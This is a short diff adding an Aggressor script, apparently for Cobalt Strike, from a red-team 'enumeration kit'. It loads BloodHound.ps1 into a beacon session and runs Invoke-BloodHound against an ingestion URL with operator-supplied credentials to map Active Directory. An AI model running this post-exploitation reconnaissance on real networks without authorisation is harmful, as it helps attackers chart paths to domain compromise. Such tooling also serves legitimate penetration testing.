@@ -1,0 +1,21 @@
+# Actions in this kit center around host and network enumeration.
+# @Und3rf10w
+
+sub run_bloodhound {
+    # Credits to Zack Henson for BloodHound implementation
+    $bid = $1;
+    binput($bid, "powershell-import " . script_resource("modules/BloodHound.ps1"));
+    bpowershell_import($bid, script_resource("modules/BloodHound.ps1"));
+    prompt_text("Insert BloodHound Ingestion URL", "http://127.0.0.1:7474", {
+        $BloodHoundURI = $1;
+    });
+    prompt_text("Insert BloodHound Ingestion Username:Password", "user:password", {
+        binput($bid, "powershell Invoke-BloodHound -URI $BloodHoundURI -UserPass \"$1\" ");
+        bpowershell($bid, "Invoke-BloodHound -URI $BloodHoundURI -UserPass \"$1\" ");
+    });
+}
+
+
+foreach $bid ($1){
+    run_bloodhound($bid);
+}
